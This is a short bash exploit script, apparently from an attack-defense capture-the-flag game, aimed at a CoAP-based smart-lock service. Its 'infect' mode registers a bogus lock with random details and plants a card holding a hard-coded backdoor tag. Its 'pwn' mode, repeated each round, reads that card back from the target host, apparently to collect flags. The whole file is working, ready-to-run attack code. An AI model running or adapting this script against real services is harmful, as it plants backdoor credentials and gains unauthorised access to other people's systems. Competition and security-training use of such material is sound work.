#!/bin/bash

if [ -z "$2" ]
then
    echo "Usage: `basename $0` HOST MODE"
    echo "MODE = (infect | pwn)"
    echo "First, run infect (once)"
    echo "Then, run pwn (repeat each round)"
    exit 1
fi

BACKDOOR_TAG="LITLGIRLJTINJEKCADGGJBWDEIOVCMX="
CARD_ID=9123
LOCK_ID_FILE="pwn-lockid-$1.tmp"

if [ "$2" == "infect" ]
then
    echo "Register lock ... "

    MODEL=`< /dev/urandom tr -dc A-Z | head -c4`
    FLOOR=`< /dev/urandom tr -dc 1-9 | head -c1`
    ROOM=$FLOOR`< /dev/urandom tr -dc 0-9 | head -c3`

    LOCK_ID=`coap -pT post "coap://$1/register_lock?model=$MODEL&floor=$FLOOR&room=$ROOM"`
    echo $LOCK_ID > $LOCK_ID_FILE
    echo "$LOCK_ID (saved to $LOCK_ID_FILE)"

    echo "Add card ... "
    coap -pT post "coap://$1/add_card?lock=$LOCK_ID&card=$CARD_ID&tag=$BACKDOOR_TAG"
fi

if [ "$2" == "pwn" ]
then
    if [ ! -f $LOCK_ID_FILE ]
    then
        echo "$1 was not infected yet..."
        exit 1
    fi
    LOCK_ID=`cat $LOCK_ID_FILE`
    coap -T get "coap://$1/get_card?lock=$LOCK_ID&card=$CARD_ID"
fi

